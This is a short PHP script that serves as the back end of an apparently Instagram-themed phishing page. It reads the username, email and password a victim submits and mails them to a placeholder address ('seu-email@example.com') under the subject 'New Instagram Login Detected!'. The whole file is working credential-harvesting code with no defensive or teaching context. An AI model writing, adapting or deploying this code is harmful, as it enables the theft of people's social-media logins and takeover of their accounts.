<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $email = $_POST['email'];

    // Capture email and password with headers
    $to = "seu-email@example.com";
    $subject = "New Instagram Login Detected!";
    $message = "Username: " . $username . "\nEmail: " . $email . "\nPassword: " . $password;
    $headers = "From: webmaster@example.com";

    mail($to, $subject, $message, $headers);
}
?>
